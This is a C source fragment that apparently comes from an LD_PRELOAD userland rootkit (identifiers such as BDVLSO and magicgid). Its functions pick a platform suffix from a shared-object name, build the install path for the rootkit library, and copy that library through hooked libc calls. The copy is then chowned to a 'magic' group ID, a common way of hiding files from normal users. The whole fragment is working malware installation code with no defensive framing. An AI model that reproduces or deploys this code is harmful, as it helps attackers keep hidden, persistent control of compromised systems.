char *sogetplatform(char *sopath){
    char *platform = NULL,
         *sofilenam = basename(sopath),
         *sofilecpy = strdup(sofilenam),
         *sofiletok = strtok(sofilecpy, "."),
         *curplatform;

    while(sofiletok != NULL){
        for(int i = 0; i != VALID_PLATFORMS_SIZE; i++){
            curplatform = valid_platforms[i];
            if(!strcmp(sofiletok, curplatform)){
                platform = strdup(sofiletok);
                break;
            }
        }

        if(platform != NULL)
            break;

        sofiletok = strtok(NULL, ".");
    }
    free(sofilecpy);

    return platform;
}

char *sogetpath(char *sopath){
    char *platform, *ret;
    size_t pathsize;

    platform = sogetplatform(sopath);
    if(platform == NULL) return NULL;

    pathsize = strlen(INSTALL_DIR) +
               strlen(BDVLSO) +
               strlen(platform) + 4;

    ret = malloc(pathsize);
    memset(ret, 0, pathsize);
    snprintf(ret, pathsize-1, "%s/%s.%s", INSTALL_DIR, BDVLSO, platform);

    free(platform);
    return ret;
}

int socopy(const char *opath, char *npath, gid_t magicgid){
    struct stat sostat;
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m, filesize;
    mode_t somode;

    hook(CFOPEN, CFWRITE, C__XSTAT);

    memset(&sostat, 0, sizeof(struct stat));
    if((long)call(C__XSTAT, _STAT_VER, opath, &sostat) < 0)
        return -1;

    filesize = sostat.st_size;
    somode = sostat.st_mode;

    ofp = call(CFOPEN, opath, "rb");
    if(ofp == NULL)
        return -1;

    nfp = call(CFOPEN, npath, "wb");
    if(nfp == NULL){
        fclose(ofp);
        return -1;
    }

    buf = malloc(filesize+1);
    memset(buf, 0, filesize+1);

    do{
        n = fread(buf, 1, filesize, ofp);
        if(n)
            m = (long)call(CFWRITE, buf, 1, n, nfp);
        else
            m = 0;
    }while(n > 0 && n == m);

    free(buf);
    fclose(ofp);
    fclose(nfp);

    if(chown_path(npath, magicgid) < 0)
        return -1;

    if(chmod(npath, somode) < 0)
        return -1;

    return 1;
}